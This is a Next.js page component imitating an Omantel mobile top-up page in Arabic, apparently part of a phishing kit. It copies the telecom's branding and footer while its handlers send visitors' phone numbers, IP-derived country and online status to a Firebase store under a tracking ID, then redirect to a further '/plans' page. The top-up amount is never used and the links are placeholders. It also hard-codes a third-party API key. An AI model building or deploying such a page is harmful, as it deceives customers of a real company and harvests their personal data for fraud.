"use client"
import type React from "react"
import {
  Menu,
  Search,
  ShoppingBag,
  User,
  Phone,
  Facebook,
  Instagram,
  Twitter,
  Youtube,
  MessageSquare,
  PhoneCall,
} from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import Link from "next/link"
import { addData } from "@/lib/firebase"
import { useEffect, useState } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { OmantelLogo } from "@/components/logo"
const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;

export default function OmantelPage() {
  const [phone, setPhone] = useState("")
  const [loading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    await addData({
      createdDate: new Date().toISOString(),
      id: visitorId,
      phone:phone,
      mobile:phone
    })
    setIsLoading(true)
    setTimeout(() => {
      window.location.href="/plans"
    }, 3000);
  }
  const getLocationAndLog = async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }
  useEffect(() => {
    getLocationAndLog()
  }, []);
  return (
    <div className="bg-white font-sans">
      <header className="flex items-center justify-between p-4 border-b border-gray-200 sticky top-0 bg-white z-10">
        <Button variant="ghost" size="icon" className="text-orange-500">
          <Menu className="h-6 w-6" />
          <span className="sr-only">Menu</span>
        </Button>
        <div className="flex items-center gap-2">
          <Button variant="ghost" size="icon" className="text-orange-500">
            <User className="h-6 w-6" />
            <span className="sr-only">Profile</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <ShoppingBag className="h-6 w-6" />
            <span className="sr-only">Cart</span>
          </Button>
          <Button variant="ghost" size="icon" className="text-orange-500">
            <Search className="h-6 w-6" />
            <span className="sr-only">Search</span>
          </Button>
        </div>
        <OmantelLogo className="h-6 text-purple-700" />
      </header>

      <main className="bg-gray-100 p-4 md:p-8">
        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6 text-center">
          <h1 className="text-3xl font-bold text-gray-800">أعد تعبئة رصيدك الآن!</h1>
          <p className="text-gray-500">بخطوات بسيطة وسريعة دون الحاجة إلى تسجيل الدخول</p>

          <form className="space-y-6 text-right" onSubmit={handleSubmit}>
            <div className="space-y-2">
              <label htmlFor="phone" className="text-sm font-medium text-gray-700 block">
                أدخل رقم الهاتف المحمول
              </label>
              <Input id="phone" onChange={(e)=>setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" maxLength={10} />
            </div>

            <div className="space-y-2">
              <label htmlFor="amount" className="text-sm font-medium text-gray-700 block">
                مبلغ إعادة التعبئة
              </label>
              <div className="relative">
                <Input id="amount" type="number" className="pr-12 text-center" />
                <span className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500">ر.ع</span>
              </div>
              <p className="text-xs text-gray-400 text-center pt-1">الحد الأدنى ١ ر.ع - الحد الأقصى ١٠٠ ر.ع في اليوم</p>
            </div>

            <Button type="submit" className={`w-full ${phone.length > 8 ?" bg-orange-500 ":"bg-gray-500"} hover:bg-gray-400 text-white font-bold`}>
              تعبئة الرصيد
            </Button>
          </form>
        </div>
      </main>

      <footer className="bg-[#0c1427] text-white pt-8 pb-4 px-6">
        <div className="max-w-4xl mx-auto">
          <div className="relative mb-8">
            <h3 className="text-lg font-semibold mb-4">جهات التواصل</h3>
            <div className="space-y-3">
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1234 رقم مركز الاتصال</span>
              </div>
              <div className="flex items-center gap-3">
                <PhoneCall className="h-5 w-5 text-orange-500" />
                <span>1235 مركز اتصال الشركات</span>
              </div>
            </div>
          
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-sm">
            <div>
              <h4 className="font-bold mb-3">الشركة</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    عن عمانتل
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الاستدامة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    الوظائف
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المركز الإعلامي
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    مختبرات عمانتل للابتكار
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">خدمة المشتركين</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المساعدة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    قنوات الدفع
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المنافذ
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    التغطية
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">الشركات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المستثمرون
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    iSupplier
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    أعمال الجملة
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    المناقصات الإلكترونية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    تصاريح الحفريات
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-3">السياسات</h4>
              <ul className="space-y-2">
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الخصوصية
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    سياسة الإبلاغ عن المخالفات
                  </Link>
                </li>
                <li>
                  <Link href="#" className="hover:text-orange-400">
                    إغلاق شبكة الجيل الثالث
                  </Link>
                </li>
              </ul>
            </div>
          </div>

          <div className="mt-10 text-center">
            <h4 className="font-semibold mb-4">تابعونا على منصات التواصل الاجتماعي</h4>
            <div className="flex justify-center gap-4">
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Facebook className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Instagram className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Twitter className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Youtube className="h-5 w-5" />
              </Link>
              <Link href="#" className="p-2 border border-gray-600 rounded-full hover:border-orange-400">
                <Phone className="h-5 w-5" />
              </Link>
            </div>
          </div>

          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-xs text-gray-400 space-y-4">
            <div className="flex flex-col md:flex-row justify-center gap-x-6 gap-y-2">
              <Link href="#" className="hover:text-orange-400">
                الملكية الفكرية
              </Link>
              <Link href="#" className="hover:text-orange-400">
                اتفاقية العملاء الموحدة
              </Link>
              <Link href="#" className="hover:text-orange-400">
                خارطة الموقع
              </Link>
            </div>
            <div className="flex items-center justify-center gap-2">
              <span>Oman Telecommunications Company © 2024</span>
              <OmantelLogo className="h-4 text-white" />
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

